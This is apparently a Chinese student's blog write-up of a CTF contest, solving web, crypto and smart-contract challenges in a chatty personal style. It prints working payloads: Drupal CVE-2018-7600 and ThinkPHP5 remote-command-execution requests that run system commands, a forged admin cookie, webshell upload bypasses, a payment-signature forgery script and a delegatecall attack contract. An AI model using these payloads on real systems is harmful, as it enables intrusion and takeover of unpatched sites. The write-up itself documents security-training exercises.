---
title: 双月赛诶嘿嘿
date: 2018-12-16 18:51:04
tags:
thumbnail: "https://s1.ax1x.com/2018/12/16/FddCYF.jpg"
---

> 再也读不到传世的檄文，只剩下廊柱上龙飞凤舞的楹联。
>
> 再也找不见慷慨的遗恨，只剩下几座既可凭吊也可休息的亭台。
>
> 再也不去期待历史的震颤，只有凛然安坐着的万古湖山。

本来为了去看无敌破坏王2特意看了1结果看的很悲伤。虽然是HE可是要不是发生了这一些事rafu根本不会受到证明。后面他去敲曼妥思的时候真的太虐了。然后小女孩瞬移过去的时候又是感动嘤嘤嘤。然后2因为影院只有中文版了也没看成QAQ

所以这两天只好做这个。。双月赛惹x（虽然中间还看了n集越狱和一出好戏。。人类真的可啪。唉

#### ez-upload

修改后缀为phtml，传马连接

（upload目录直接可以看，看看别人传的什么能解析就好了

结果hint嗦是.htaccess，非预期惹23333

#### Cve\~~~~~

题目这么明显了找cve呗

[drupal7~8 CVE-2018-7600](https://www.jianshu.com/p/7c410db788ed) （这个貌似是以前xman的小伙伴，差距啊orzzzz

```
POST /?q=user/password&name[%23post_render][]=system&name[%23markup]=cat%20../../../../../flag&name[%23type]=markup HTTP/1.1

form_id=user_pass&_triggering_element_name=name
```

[![Fd2NWt.md.png](https://s1.ax1x.com/2018/12/16/Fd2NWt.md.png)](https://imgchr.com/i/Fd2NWt)

在相应中找到form_build_id的值然后继续请求

```
POST /?q=file/ajax/name/%23value/form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU HTTP/1.1

form_build_id=form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU
```

![Fd2wy8.png](https://s1.ax1x.com/2018/12/16/Fd2wy8.png)

得到flag

#### secret-system

慕测省赛的题。。

找到xjb学长的github里项目的介绍

>It's just a system which is not completed , there are some tips:
>
>1. you can use test/cib_sec to login ,but you are not admin!
>2. only admin can upload file ,but whichone can not bypass my rules.
>
>```
>/**
>$sign = array(
>                    'id'=>$model->id,
>                    'name'=>$model->username,
>                    'sign'=>md5($model->id.$model->username),
>                );
>$_COOKIE['Cib_security'] = serialize($sign);
>**/
>```

先test/cib_sec登录，cookie反序列化获得admin权限

![FdRh9I.png](https://s1.ax1x.com/2018/12/16/FdRh9I.png)

`a%3a3%3a%7bs%3a2%3a%22id%22%3bi%3a1%3bs%3a4%3a%22name%22%3bs%3a5%3a%22admin%22%3bs%3a4%3a%22sign%22%3bs%3a32%3a%226c5de1b510e8bdd0bc40eff99dcd03f8%22%3b%7d` 

上传pht绕过得到shell

#### shop

安恒月赛原题

阅读源码，伪造交易只需要sign和信息对应，于是使用admin账户购买，数据库文件中可获取admin的id

```
import hashlib

form = {
    'order_id': '130',   
    'buyer_id': '16',  # 管理员ID
    'good_id': '38',   # flag商品的ID
    'buyer_point': '250',
    'good_price': '50',
    'order_create_time': '1544797474.153053'
}
RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = 'zhinianyuxin\n'.encode('utf-8')
str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + '&'.join([f'{i}={form[i]}' for i in form]).encode('utf-8')
sign = hashlib.md5(str2sign).hexdigest()
print(sign)
```

注意signature有换行符23333抓包修改信息即可

![FdRRNd.png](https://s1.ax1x.com/2018/12/16/FdRRNd.png)

#### tp5

依旧是最近的漏洞 [ThinkPHP5远程命令执行漏洞POC](http://mzblogg.com/thinkphp_poc/) 

`http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20../../../../flag`

#### shell?

嗯。。。充满迷惑的一题

第一下弱密码登录发现一个疑似读文件的，结果神它喵过滤x

最后发现还是注入加图片马。。。队友做的，图片绕过的看[链接](https://www.freebuf.com/articles/web/54086.html)叭

#### 现代密码

有n,c1,c2,e1,e2，明显就是rsa共模攻击惹，分分钟拿粗珍藏多年（啊呸x的脚本

但是这个。。。是啥子编码。。。。惊了

[![FdTtYD.md.png](https://s1.ax1x.com/2018/12/16/FdTtYD.md.png)](https://imgchr.com/i/FdTtYD)

这时候窝就想发这个表情包。。![FdTdld.png](https://s1.ax1x.com/2018/12/16/FdTdld.png)

看见米有！看见米有！！！

```
str=str.replace('Z','2')
str=str.replace('T','7')
str=str.replace('O','0')
str=str.replace('I','1')
str=str.replace('S','5')
str=str.replace('B','8')
str=str.replace('g','9')
str=str.replace('A','4')
str=str.replace('b','6')
str=str.replace('E','3')
```

然后共模脚本启动！

![Fd7CtO.png](https://s1.ax1x.com/2018/12/16/Fd7CtO.png)

十六进制才能转文本。。。扎心了

#### ez-Preservation

一天区块链速成！开心x

刚开始先去看了几个学长链接里分享哒视频。。然后发现太鸡儿多了

下载了超可爱的metamask插件，小狐狸头转来转去真的。。戳中萌点啊，就想到窝给她们看狐狸帽叽的时候都嫌弃窝！辣么可爱wwwwww，然后在ropsten测试网上先要饭ing~点击request要饭~就要到惹1 ether！看着转换的USD感觉寄几不用找富婆惹qvq（但都是假的嘤嘤嘤，吸引富婆.jpg

于是转换方式去玩游戏惹 [The Ethernaut byZeppelin](https://ethernaut.zeppelin.solutions/) 

中途跑去看了个视频练了下听力？ [Ethereum Smart Contracts In Solidity](https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR)

然后就信心满满地开始看代码试图手撸？

```
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  event FLAG(string b64email, string slogan);

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }

  function CaptureTheFlag(string b64email) public{
    require (owner == msg.sender);
    emit FLAG(b64email, "Congratulations to capture the flag!");
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

然后。。11行。突然进入bfm老师的口头禅萌萌哒状态？

于是搜keccak256，嗯，是个加密

然后搜bytes4(keccak256("setTime(uint256)"))，嗯，是个原题。。。啊？桥豆麻袋？原题？？还是刚刚做的那个平台上的？？？

于是delegatecall的漏洞，直接有attack.sol

```
contract Attack {
  uint padding1;
  uint padding2;
  address public owner;

  function setTime(uint _time) public {
      owner = tx.origin;
  }
}
```

按wp来在remix上先自己deploy了一个，owner改变成攻击者addr完全o文明k

然后。。。怎么和题目部署的那个交互嘞？？at address里填进去，调用函数，返回报错了？喵喵喵？？

于是开始艰难地查找如何和合约交互。。啥web3啊，啥truffle啊。。惊了

后来发现。。。神它喵remix没连上窝metamask的账号。。。窝嗦怎么有那么多。。。佛了

然后连上，at address，把攻击地址作为参数call set2那个函数，没变？喵喵喵？？

去ropsten看合约，感叹号是啥子意思？？你fee都收了不给我改？？啥？out of gas？？？

于是在comfirm那个弹窗里修改gas，成功√

[![FwZv7t.md.png](https://s1.ax1x.com/2018/12/16/FwZv7t.md.png)](https://imgchr.com/i/FwZv7t)

贴心地一连发了五份233333

![FdWZgx.png](https://s1.ax1x.com/2018/12/16/FdWZgx.png)

#### 其他

pwn第二道原题  [House of Roman](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/) 吹图二二2333333

另外神它喵看hint扣了110分。。。做粗来了还扣，结束了还扣，，差评x

***

明天次鹅肉！开心~

最后，真的很想去索拉利世界。哭惹。